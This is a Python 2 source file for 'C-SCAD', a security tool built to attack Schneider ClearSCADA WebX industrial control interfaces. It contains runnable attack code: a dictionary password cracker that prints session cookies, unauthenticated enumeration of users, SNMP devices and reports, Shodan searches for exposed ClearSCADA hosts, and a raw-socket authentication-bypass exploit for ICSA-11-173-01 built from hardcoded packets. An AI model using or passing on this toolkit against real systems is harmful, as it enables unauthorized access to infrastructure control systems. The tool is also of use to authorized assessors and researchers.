#!/usr/bin/python
'''
Original BSD License (BSD with advertising)

Copyright (c) 2014, {Aditya K sood}
All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:
    * Redistributions of source code must retain the above copyright notice,
    this list of conditions and the following disclaimer.
    * Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.
    * Neither the name of SecNiche nor the names of its contributors
    may be used to endorse or promote products derived from this software
    without specific prior written permission.
    
THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT,
INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE
OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED
OF THE POSSIBILITY OF SUCH DAMAGE.
'''                                              

# API key used for accessing Shodan
SHODAN_API_KEY = <YOUR KEY>


# importing required libraries for successful execution of this tool

lib_requirements = ['os','sys','urllib','urllib2','socket', 'time' , 're','httplib','ssl','optparse','HTMLParser', 'urlparse','shodan']
for import_library in lib_requirements:
    try:
        globals()[import_library] = __import__(import_library)
    except:
        print "[-] %s - import library failed !" %(import_library)
        print "[-] tool cannot continue, please install the required library !"
        print "[*] sudo apt-get install python-setuptools to install 'easy_install'"
        sys.exit(0)
try:
    from BeautifulSoup import BeautifulSoup
except:
    print "[-] import library failed for BeautifulSoup !"
    sys.exit(0)
try:
    import xml.dom.minidom as minidom
except:
    print "[-] import library failes for xml.dom.minidom !"
    sys.exit(0)


# standard directory list used in ClearSCADA WebX client   
clear_scada_dir = ['db/','alarms/','list/','logon/','webservices']

# generic check - list of Expressing Style Sheet (XSL) files on the WebX Client running on embedded web server.
clear_scada_xsl = ['file/xsl/viewinfo.xsl','file/xsl/common.xsl','file/xsl/lists.xsl','file/xsl/layout.xsl','file/xsl/logon.xsl','file/xsl/message.xsl']

# C-SCAD banner
def banner():
    print "\t-----------------------------------------------------------"
    cs_banner = """  
	 ______               ______    ______    ________    ______
	/_____/\             /_____/\  /_____/\  /_______/\  /_____/\     
	\:::__\/     _______ \::::_\/_ \:::__\/  \::: _  \ \ \:::_ \ \    
	 \:\ \  __  /______/\ \:\/___/\ \:\ \  __ \::(_)  \ \ \:\ \ \ \   
	  \:\ \/_/\ \__::::\/  \_::._\:\ \:\ \/_/\ \:: __  \ \ \:\ \ \ \  
	   \:\_\ \ \            /____ \:\ \:\_\ \ \ \:.\ \  \ \ \:\/.:| | 
	    \_____\/            \_____\/   \_____\/  \__\/\__\/  \____/_/ 
	     		                                                                                                
        C-SCAD : Schneider ClearSCADA: WebX (Client) Security Assessment Tool!
        Authored by: Aditya K Sood |contact [at] secniche.org  | 2014
        Twitter:     @AdityaKSood
        Powered by: SecNiche Security Labs ! (http://www.secniche.org)
        
        ClearSCADA : http://www.schneider-electric.com/products/
        ClearSCADA Spec : http://plcsystems.ru/catalog/SCADAPack/doc/ClearSCADA_spec_eng.pdf
        """
    print cs_banner
    print "\t----------------------------------------------------------"

# important facts about ClearSCADA WebX Client tool and deployment
# 1. By default, username and passwords are case sensitive in ClearScada WebX.
# 2. Use the option to extract users from the target portal and then build your users.txt file accordingly. 
# 3. The user extracttion query does not list the super-user until a same account exists.


# defining the generalized pattern for the URL
def audit(url,path):
    return url + "/" + path

# dictionary attack function used to trigger dictionary attack against ClearSCADA Web-X Client.
def trigger_dict_attack(target_url):
    try:
        user_list = []
        password_list = []
        print "\n[+] reading user names from users.txt file !"
        user_file = open("users.txt","r")
        for line in user_file:
            user_list.append(line.rstrip())
        
        print "[+] reading password from pass.txt file !"
        password_file = open("pass.txt","r")
        for line in password_file:
            password_list.append(line.rstrip())
        
        login_url = target_url + "/logon"

        print "[*] user and password list is constructed successfully!"
        print "[*] executing dictionary attack against : %s" %login_url
        
        for user in user_list:
            for password in password_list:
                headers = {}
                headers['Content-Type'] = 'application/x-www-form-urlencoded'
                headers['Connection'] = 'keep-alive'
                headers['Referer'] = target_url + "?redir=/"
                headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1'
                creds = {'user':user, 'password':password}
                data= urllib.urlencode(creds)
                req = urllib2.Request(login_url, data, headers)
                response = urllib2.urlopen(req)
                dump_data = response.read()
                
                if 'Invalid username or password' in dump_data:
                    print "[FAILED] (%s) | (%s) " %(user,password)
                else:
                    print "----------------------------------------------------------------------------------"
                    print "[SUCCESS] (%s) | (%s) (VIOLA, HUSTLE!)" %(user,password)
                    print "[Cookie]  (%s)" %response.info()['Set-Cookie']
                    print "----------------------------------------------------------------------------------"
                time.sleep(1)

    except urllib2.HTTPError as h:
        print "[-] (%s) - (%d)" %(target_url, h.code)
        pass
    
    except urllib2.URLError as e:
        print "[-] URL error : %s" %e.args
        pass	

    except IOError:
        print "[-] it seems like users.txt and pass.txt file fails to load !"
        print "[*] verify that files are in correct format and try again  !"
        sys.exit(0)

# extracting the HTTP response code for a specific HTTP request
def get_http_status_codes(domain):
    try:
        handle = urllib2.urlopen(domain , timeout =15)
        info = handle.info()
        response_code = handle.getcode()
        print "[+] (%s) - (%d)" %(domain,response_code)
        return response_code
    
    except urllib2.HTTPError as h:
        print "[-] (%s) - (%d)" %(domain,h.code)
        pass
    
    except TypeError as h:
        print "[-] check if options such as url has been specified properly!"
        sys.exit(0)
    
    except ValueError as h:
        print "[-] check if options such as url has been specified properly!"
        sys.exit(0)
    
    except urllib2.URLError as e:
        print "[-] URL error : %s" %e.args
        pass

    except socket.timeout:
        print "[-] target is not responding with given timeout span of 15 minutes for %s" %domain
        sys.exit(0)

    except UnboundLocalError:
        pass

# SQL query to extract list of configured users on the ClearSCADA Webx
def get_user_list(target_domain):
    path_one = "/list/Users?SELECT%20%22FullName%22%20AS%20%22~FullName%22%2c%20%22Id%22%2c%20%22Foreground%22%2c%20%22Blink%22%2c%20%22Background%22%2c%20%22PasswordExpiryTime%22%2c%20%22UserGroupNames%22%2c%20%22TypeDesc%22%2c%20%22MemoryUsage%22%20FROM%20CDBUser%20ORDER%20BY%20%22~FullName%22%20ASC"   

    path_two = "/list/Users?SELECT%20%22FullName%22%20AS%20%22~FullName%22%20FROM%20CDBUser%20ORDER%20BY%20%22~FullName%22%20ASC"
    
    print "[+] trying to access users list with query : %s" %path_one
    target_path_one = target_domain + path_one
    print "%s" %dump_http_raw_content(target_path_one)
    print"\n[+] trying to access users list with query : %s" %path_two
    target_path_two = target_domain + path_two
    print "%s" %dump_http_raw_content(target_path_two)
    print "[+] cleaned XML data results in following users !"
    for user in re.findall(r'<Value>(.*?)</Value>',dump_http_raw_content(target_path_two)):
        print "[U] %s" %user

    print "[*] Remove the 'User.' suffix from the above strings to extract user_names !"
    return

# check the presence of crystal reports
def get_crystal_reports(target_domain):
    report_path = "/list/Reports?SELECT%20%22FullName%22%20AS%20%22~FullName%22%2c%20%22Id%22%2c%20%22Foreground%22%2c%20%22Blink%22%2c%20%22Background%22%2c%20%22StatusDesc%22%2c%20%22DataTimestamp%22%2c%20%22QualityDesc%22%2c%20%22TypeDesc%22%2c%20%22MemoryUsage%22%20FROM%20CCrystalReport%20ORDER%20BY%20%22~FullName%22%20ASC"
    print "[+] trying to check the presence of reports : %s" %report_path
    target_path = target_domain + report_path
    print "%s" %dump_http_raw_content(target_path)
    for report in re.findall(r'<Value>(.*?)</Value>',dump_http_raw_content(target_path)):
        print "[R] %s" %report
    return

# list of available SNMP device
def get_snmp_device_list(target_domain):
    path_one = "/list/SNMP%20Devices?SELECT%20%22FullName%22%20AS%20%22~FullName%22%2c%20%22Id%22%2c%20%22Foreground%22%2c%20%22Blink%22%2c%20%22Background%22%2c%20%22StateDesc%22%2c%20%22DataTimestamp%22%2c%20%22QualityDesc%22%2c%20%22CurrentRequest%22%2c%20%22SourceName%22%2c%20%22Source%22%2c%20%22TypeDesc%22%2c%20%22MemoryUsage%22%2c%20%22AlarmViewLink%22%20FROM%20CSNMPDevice%20ORDER%20BY%20%22~FullName%22%20ASC"
    
    print "[+] trying to access SNMP device list with query : %s" %path_one
    target_path_one = target_domain + path_one
    print "%s" %dump_http_raw_content(target_path_one)
    print "[+] cleaned XML data results in following SNMP devices !"
    for snmp in re.findall(r'<Value>(.*?)</Value>',dump_http_raw_content(target_path_one)):
        print "[S] %s" %snmp
    return



# list accumulators
def get_accumulator_list(target_domain):
    path_one = "/list/Accumulators?SELECT%20%22FullName%22%20AS%20%22~FullName%22%2c%20%22Id%22%2c%20%22Foreground%22%2c%20%22Blink%22%2c%20%22Background%22%2c%20%22CurrentTotalFormatted%22%2c%20%22CurrentTotalTime%22%2c%20%22CurrentTotalQualityDesc%22%2c%20%22TypeDesc%22%2c%20%22MemoryUsage%22%20FROM%20CAccumulatorBase%20ORDER%20BY%20%22~FullName%22%20ASC"
    
    print "[+] trying to access accumulator list with query : %s" %path_one
    target_path_one = target_domain + path_one
    print "%s" %dump_http_raw_content(target_path_one)
    print "[+] cleaned XML data results in following accumualtor lits !"
    for accumualtor in re.findall(r'<Value>(.*?)</Value>',dump_http_raw_content(target_path_one)):
        print "[A] %s" %accumualtor
    return


# extract processed responses from web page data
def dump_http_responses(domain):
    try:
        handle = urllib2.urlopen(domain)
        info = handle.read()
        parse = HTMLParser.HTMLParser().unescape(urllib2.unquote(info))
        return  parse	
    
    except urllib2.HTTPError as h:
        print "[-] (%s) - (%d)" %(domain,h.code)
        pass
   
    except TypeError as h:
        print "[-] check if options such as url has been specified properly!"
        sys.exit(0)
    
    except ValueError as h:
        print "[-] check if options such as url has been specified properly!"
        sys.exit(0)
    
    except httplib.BadStatusLine:
        print "[-] server responds with bad status !"
        pass
    
    return

# dump complete HTTP raw content
def dump_http_raw_content(domain):
    try:
        handle = urllib2.urlopen(domain)
        raw_info = handle.read()
        return raw_info
    
    except (urllib2.HTTPError , ValueError, TypeError):
        pass

# access the dignostics web page and associated links
def diagnostics_access(target_url):
    diag_path = "/diag/Info"
    base_path = target_url + diag_path
    print "[+] Trying to access diagnostics webpage: verifying configuration flaw! "
    if get_http_status_codes(base_path) == 200:
        print "[+] Hola ! diagnostics page responded with | %s" %(base_path)
        print "[+] Let's see what direct links are available ........"
        print "[+] Dumping ......\n"
        result = dump_http_raw_content(base_path)
        if "not authorized" in result:
            print "[*] looks like authorization is in place, links cannot be dumped, QUITTING !"
        else:
            diag_element = [r'<Page.*?\s*name=\"(.*?)\".*?>(.*?)</Page>']
            for link in extract_links(result,diag_element):
                print "[L]" + target_url + "/diag/" + link
        
    else:
        print "[-] Shocked ! diagnostics page cannot be accessed !"
    return

# prototype for querying specific links in web pages recursively using beautiful soup
def recursive_query_database_links(soup_handle, data, base_link,link_name,class_name):
    parent = soup_handle.findAll(link_name,{'class':class_name})
    for child_link in parent:
        path = child_link.get('href')
        process_link = urlparse.urlparse(base_link).scheme + "://" + urlparse.urlparse(base_link).netloc
        next_link = process_link + path 

        if next_link != "":
            print "[L] " + next_link     #then if the new_link isnt empty it gets the new soup
            next_soup_handle = BeautifulSoup(urllib2.urlopen(next_link).read())
            data = recursive_query_database_links(next_soup_handle, data, next_link, link_name,class_name) 
    return data

# getting webpage data using beautiful soup
def get_soup_data(link):
    web_page = urllib2.urlopen(link)
    soup_handle = BeautifulSoup(web_page)
    return soup_handle

# setting program information
def program_info():
    banner()
    print '\n[+] usage - %s <clear scada web interface IP address> ' %sys.argv[0]
    print '[+] note: be sure to provide only IP Address or Domain !\n'

# extract links from web page using re
def extract_links(buff, tree = []):
    refine_target = []
    for branch in tree:
        hyper_links = re.findall(str(branch),buff)
        for link in hyper_links:
            print "[Command] : %s \n[Query] : %s" % (link[1], link[0])
            print "---------------------------------------------------"
            refine_target.append(link[0])
            
    return refine_target

# filter link values
def filter_links(content, tree = []):
    ref_links = []
    for branch in tree:
        hyper_links = re.findall(str(branch),content)
        for link in hyper_links:
            ref_links.append(link[0])

    return ref_links

#extract ClearSCADA version from help file
def extract_version(target_url):
    path_ver = "/file/help_en-US/Content/WelcomePage.htm"
    base_path = target_url + path_ver
    if get_http_status_codes(base_path) == 200:
        print "[+] Seems help files are present : %s" %base_path
        print "[*] Trying to extract installed ClearSCADA version !"
        link_ver = []
        result = dump_http_raw_content(base_path)
        ver_element = [r'<span.*?\s*xmlns=\"(.*?)\".*?>(.*?)</span>']
        scada_version = filter_links(result,ver_element)
        print "[+] Installed version is: %s" %scada_version
         
    else:
        print "[-] cannot access help file (not present) !"
        print "[-] ClearSCADA version from help file cannot be extracted!"
    return

# shodan query module
def shodan_query():
    try:
        target_query = "clearscada"
        api_key = SHODAN_API_KEY
        if api_key  == "":
            print "[-] Shodan API key is missing, embed api key in (%s) for querying results !" %sys.argv[0]
            sys.exit(0)

        shodan_api_query = shodan.Shodan(api_key)
        shodan_results = shodan_api_query.search(target_query)
        print "\n[*] ----------------------------------------------------------------"
        print "[*] total number of SHODAN results found for ClearSCADA: %s" % shodan_results['total']
        print "[*] ----------------------------------------------------------------"
        for result in shodan_results['matches']:
            print 'IP:PORT:HOSTNAME  %s:%s:%s' % (result['ip_str'], result['port'], result['hostnames'])
           # print result['data']
            print "------------------------------------------------------------------------------------------"
    except Exception, reason:
                print "[-] error in running shodan query : %s" % reason

    return


# checking SSL enabled or not
def check_https_or_http(target):
    ssl_handle = httplib.HTTPSConnection(target)
    ssl_handle.request("GET","/")
    response = ssl_handle.getresponse()
    if response.status == 200:
        target_url = "https://" + target
    else:
        target_url = "http://" + target
    return target_url


# generalizing the server idenitification
def server_identify(target_server):
    target = check_https_or_http(target_server)
    if "https" in target:
        print "[*] %s is configured with SSL ! GOOD !" %target
    else:
        print "[*] %s is not configured with SSL ! BAD !" %target
        print "[*] %s is potential vulnerable to network sniffing attacks due to lack of HTTPS!\n" %target
        
    build_request = urllib2.Request(target)
    handle = urllib2.urlopen(build_request)
    print "[+] engaging with target : (%s)" %target
    print "[+] HTTP code returned : (%s)" %handle.getcode()
    print "[+] configured ClearScada web server version: (%s)" %handle.info()['server']
    return target

# using th PoC provided by Jeremy Brown - http://ics-cert.us-cert.gov/advisories/ICSA-11-173-01

def trigger_auth_bypass(target_url):
    server_identify(target_url)
    exploit_packet_one=(
            "\xfb\x0e\x45\x06\x0e\x00\x00\x00\x18\x00\x00\x00"
            "\x49\x00\x50\x00\x20\x00\x31\x00\x32\x00\x37\x00\x2e\x00\x30\x00"
            "\x2e\x00\x30\x00\x2e\x00\x31\x00\x2c\x00\x20\x00\x53\x00\x65\x00"
            "\x73\x00\x73\x00\x69\x00\x6f\x00\x6e\x00\x20\x00\x30\x00\x00\x00"
            "\x08\x00\x00\x00"
            )

    exploit_packet_two=(
            "\x00\x00\x00\x00"
            "\x26\x00\x00\x00"
            "\x08\x00\x00\x00\x0f\x00\x00\x00\x43\x00\x72\x00\x79\x00\x73\x00"
            "\x74\x00\x61\x00\x6c\x00\x52\x00\x65\x00\x70\x00\x6f\x00\x72\x00"
            "\x74\x00\x73\x00\x00\x00"
            )

    exploit_packet_three=( # "Exception Occured"
            "\x00\x00\x00\x00\xd7\x01\x00\x00\x34\x00\x00\x00\x0d\x00\x00\x00"
            "\x09\x00\x00\x00\x43\x00\x50\x00\x72\x00\x6f\x00\x66\x00\x69\x00"
            "\x6c\x00\x65\x00\x00\x00\x0e\x00\x00\x00\x43\x00\x50\x00\x72\x00"
            "\x6f\x00\x66\x00\x69\x00\x6c\x00\x65\x00\x46\x00\x6c\x00\x6f\x00"
            "\x61\x00\x74\x00\x00\x00\x0e\x00\x00\x00\x43\x00\x50\x00\x72\x00"
            "\x6f\x00\x66\x00\x69\x00\x6c\x00\x65\x00\x55\x00\x4c\x00\x6f\x00"
            "\x6e\x00\x67\x00\x00\x00\x0d\x00\x00\x00\x43\x00\x50\x00\x72\x00"
            "\x6f\x00\x66\x00\x69\x00\x6c\x00\x65\x00\x4c\x00\x6f\x00\x6e\x00"
            "\x67\x00\x00\x00\x10\x00\x00\x00\x43\x00\x41\x00\x64\x00\xBB\x00"
            "\x00\x42\x00\x49\x00\x54\x00\x56\x00\x61\x00\x6c\x00\x75\x00\x65"
            "\x00\x4d\x00\x61\x00\x70\x00\x00\x00\x11\x00\x00\x00\x43\x00\x41"
            "\x00\x64\x00\x76\x00\x42\x00\x59\x00\x54\x00\x45\x00\x56\x00\x61"
            "\x00\x6c\x00\x75\x00\x65\x00\x4d\x00\x61\x00\x70\x00\x00\x00\x11"
            "\x00\x00\x00\x43\x00\x41\x00\x64\x00\x76\x00\x57\x00\x4f\x00\x52"
            "\x00\x44\x00\x56\x00\x61\x00\x6c\x00\x75\x00\x65\x00\x4d\x00\x61"
            "\x00\x70\x00\x00\x00\x11\x00\x00\x00\x43\x00\x41\x00\x64\x00\x76"
            "\x00\x44\x00\x49\x00\x4e\x00\x54\x00\x56\x00\x61\x00\x6c\x00\x75"
            "\x00\x65\x00\x4d\x00\x61\x00\x70\x00\x00\x00\x12\x00\x00\x00\x43"
            "\x00\x41\x00\x64\x00\x76\x00\x55\x00\x44\x00\x49\x00\x4e\x00\x54"
            "\x00\x56\x00\x61\x00\x6c\x00\x75\x00\x65\x00\x4d\x00\x61\x00\x70"
            "\x00\x00\x00\x11\x00\x00\x00\x43\x00\x41\x00\x64\x00\x76\x00\x52"
            "\x00\x45\x00\x41\x00\x4c\x00\x56\x00\x61\x00\x6c\x00\x75\x00\x65"
            "\x00\x4d\x00\x61\x00\x70\x00\x00\x00\x13\x00\x00\x00\x43\x00\x41"
            "\x00\x64\x00\x76\x00\x44\x00\x4f\x00\x55\x00\x42\x00\x4c\x00\x45"
            "\x00\x56\x00\x61\x00\x6c\x00\x75\x00\x65\x00\x4d\x00\x61\x00\x70"
            "\x00\x00\x00\x13\x00\x00\x00\x43\x00\x41\x00\x64\x00\x76\x00\x53"
            "\x00\x74\x00\x72\x00\x69\x00\x6e\x00\x67\x00\x56\x00\x61\x00\x6c"
            "\x00\x75\x00\x65\x00\x4d\x00\x61\x00\x70\x00\x00\x00\x0f\x00\x00"
            "\x00\x43\x00\x43\x00\x72\x00\x79\x00\x73\x00\x74\x00\x61\x00\x6c"
            "\x00\x52\x00\x65\x00\x70\x00\x6f\x00\x72\x00\x74\x00\x00\x00\x00"
            )

    print "\n[*] executing remote authentication bypass exploit code !"

    url_path = check_https_or_http(target_url)
    base_path = url_path + "/diag/Info"
    scada_port = 5481
    scada_target_port = target_url , scada_port
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    state_result = sock.connect(scada_target_port)
    
    sock.send(exploit_packet_one)
    response_one = sock.recv(32)
    
    sock.send(exploit_packet_two)
    response_two = sock.recv(32)
    
    sock.send(exploit_packet_three)
    response_three = sock.recv(32)
    
    sock.close()
   
    print "[*] payload triggered successfully ...... , waiting for the target to respond !"
    time.sleep(3)

    print "[*] trying to verify if safe mode condition is triggered on the server ....."
    print "[*] trying to access the target : %s" %base_path
    print "[*] if no code such as 200 or 301 is returned, try manually to access the link, could happen due to network or config problem!"
    if get_http_status_codes(base_path) == 200:
        print "[*] VIOLA ! exploit payload success, server entered in the safe mode !"
        print "[*] use --diag-access option or simply surf [%s] to access the diagnostics page" %base_path 
    else:
        print "[*] looks like server is patched or immune to the exploit code !"

#defining main routine
def main():
    banner()
    parser = optparse.OptionParser(usage="usage: %prog [options]", version="%prog 1.0")
    config = optparse.OptionGroup(parser,"Access Configuration:")
    enumeration = optparse.OptionGroup(parser,"Enumeration:")
    dict_attack = optparse.OptionGroup(parser,"Dictionary Crack:")
    general = optparse.OptionGroup(parser,"General:")
    diag_access = optparse.OptionGroup(parser,"Diagnostics:")
    shodan = optparse.OptionGroup(parser,"Shodan Search:")
    vulnerability = optparse.OptionGroup(parser, "Vulnerability Check:")

    mandatory = optparse.OptionGroup(parser,"Mandatory:")

    mandatory.add_option("-u","--url", type="string" , help="target IP Address or Domain to scan with proper structure", dest="url")
    
    config.add_option("-c", "--config_check", type="choice", choices=['full'], help="<CONFIGURATION = full> -- to check access permissions on the directory structure of CleaSCADA !", dest="config")
    
    enumeration.add_option("-e","--enum", type="choice", choices=['users_check','database','database_links','list_sql','list_reports','snmp_check','accumulator_check'], help="<ENUMERATION = users | database | database_links | list_sql | list_reports | snmp_check | accumulator_check > -- to enumerate the list of available users, databases, reports and available sql commands !", dest="enumeration")
    
    dict_attack.add_option("-a","--dict_attack", type="choice", choices=['dict_attack'], help="<DICT ATTACK = dict_attack> -- to trigger dictionary based cracking !" , dest="dict_attack")
    
    diag_access.add_option("-d","--diag_access", type="choice", choices=['diag_access','dump_diag_data'], help="<DIAGNOSTICS = diag_access | dump_diag_data> -- to verify the access to diagnostic webpage and dump data !", dest="diag_access")
   
    vulnerability.add_option("-b","--auth-bypass", type="choice", choices=["auth_bypass"], help="<EXPLOIT CODE = auth_bypass> -- exploit code for ICSA-11-173-01 ClearSCADA Remote Authentication Bypass Vulnerability !", dest="auth_bypass")

    shodan.add_option("-s","--shodan_search", type="choice", choices=['sh_search','shodan_search'], help="<SHODAN SEARCH = sh_search | shodan_search> -- to search ClearSCADA exposed WebX interface using Shodan search engine. URL option should be set to : -u = shodanhq.com !",dest="shodan")
   

    parser.add_option_group(config)
    parser.add_option_group(enumeration)
    parser.add_option_group(dict_attack)
    parser.add_option_group(diag_access)
    parser.add_option_group(shodan)
    parser.add_option_group(vulnerability)
    options, arguments = parser.parse_args()
    
    try:
        target_base = options.url
        if target_base is None:
            print "[-] specify the options. use (-h) for more help!"
            sys.exit(0)
            
        if options.diag_access == "diag_access":
            diagnostics_access(server_identify(target_base))
        
        if options.auth_bypass == "auth_bypass":
            trigger_auth_bypass(target_base)

        if options.shodan == "sh_search" or options.shodan == "shodan_search":
            shodan_query()

        if options.diag_access == "dump_diag_data":
            print "\n[+] --------------------------------------------------------------------"
            print "[+] extracted links from the diagnostics webpage  on the target system are:"
            print "[+] ----------------------------------------------------------------------"
            base_path = server_identify(target_base) + "/diag/info/"
            result = dump_http_responses(base_path)
            diag_element = [r'<Page.*?\s*name=\"(.*?)\".*?>(.*?)</Page>']
            print "\n[+] Extracted links form diagnostics web page are:"
            for link in extract_links(result,diag_element):
                print "[L]" + target + "/diag/" + link
                return

        if options.config=="full":
            extract_version(server_identify(target_base))

            print "\n[+] --------------------------------------------------------"
            print "[+] checking directory (exposed) access permissions ..... !"
            print "[+] --------------------------------------------------------"
            for item in clear_scada_dir:
                get_http_status_codes(audit(check_https_or_http(target_base),item))

            print "\n[+] ---------------------------------------------"
            print "[+] checking access rights on XSL file            !"
            print "[+] -----------------------------------------------"
            for item in clear_scada_xsl:
                get_http_status_codes(audit(check_https_or_http(target_base),item))
                
            print "\n[+] ---------------------------------------------"
            print "[+] dumping details in /webservices/ !"
            print "[+] -----------------------------------------------"
            get_data = dump_http_responses(check_https_or_http(target_base) + "/webservices/")
            print get_data

        if options.enumeration == "list_sql":
            print "\n[+] ---------------------------------------------------------"
            print "[+] allowed SQL commands [/list/] through - ViewXCtrl in IE are "
            print "[+] -----------------------------------------------------------"
            
            web_page = dump_http_responses(server_identify(target_base) + "/list/")
            list_element = [r'<List.*?\s*query=\"(.*?)\.*?>(.*?)</List>']
            extract_links(web_page,list_element)
            return
            
            print "\n[+] --------------------------------------------------------"
            print "[+] checking the presence of default evaluation applet in /db/ "
            print "[+] ----------------------------------------------------------"
            result = get_http_status_codes(check_https_or_http(target_base) + "/db/Opening%20Page?applet")
            if result == 200:
                print "[+] default evaluation template present!"
                print "[+] possibility that users (sales, eng) are configured without passwords!"
                print "[+] use IE ViewCtrlX to surf using default accounts!"
            else:
                print "[-] default evaluation template not present!"
                pass
            return
        
        if options.enumeration == "users_check":
            get_user_list(server_identify(target_base))
            return

        if options.enumeration == "snmp_check":
            get_snmp_device_list(server_identify(target_base))
            return 

        if options.enumeration == "accumulator_check":
            get_accumulator_list(server_identify(target_base))
            return
                            

        if options.enumeration == "list_reports":
            get_crystal_reports(server_identify(target_base))
            return

        if options.enumeration == "database_links":
            print "\n[+] ------------------------------------------------------------------"
            print "[+] extracted links from available databases on the target system are:  "
            print "[+] -------------------------------------------------------------------"
            base_path = server_identify(target_base) + "/db/?view"
            print "[*] extracting database links from - %s" %base_path
            recursive_query_database_links(get_soup_data(base_path),"",base_path,"child","Group")
		   
        if options.enumeration == "database":
            print "\n[+] --------------------------------------------------------"
            print "[+] configured db(s) on the target system are:  "
            print "[+] ----------------------------------------------------------"
            
            links_repo = []
            result = dump_http_responses(server_identify(target_base) + "/db/?view")
            child_element = [r'<Child.*?\s*href=\"(.*?)\".*?>(.*?)</Child>']
            print "\n[+] Extracted links are:"
            for link in extract_links(result,child_element):
                print "[L]" + check_https_or_http(target_base)+link+"/?view"
            return
        
        if options.dict_attack == "dict_attack":
            trigger_dict_attack(server_identify(target_base))
            return
        
    except IndexError as e:
        program_info()
    
    except ssl.SSLError:
        pass
   
    except (httplib.InvalidURL , socket.gaierror):
        print "[-] invalid IP Address or Domain  encountered, please specify either domain or IP address only without http or https !"
        sys.exit(0)

    except urllib2.HTTPError as h:
        if h.code == 403:
            print "[-] Error occurred : %s | %d" %(target, h.code)
            print "[-] This error usually occurs when web server limit exceeds !"
            print "[+] High probability that diagnostics web page can be accessed !"
            print "[+] Trying (-d) option to see if you can fetch additional data !"
            print ""
            diagnostics_access(server_identify(target_base))
            sys.exit(0)
    
    except KeyboardInterrupt:
        print "[-] keyboard interrupt detected !"
        sys.exit(0)
    
    except (ValueError , TypeError , NameError):
        raise

if __name__ == "__main__":
    main()
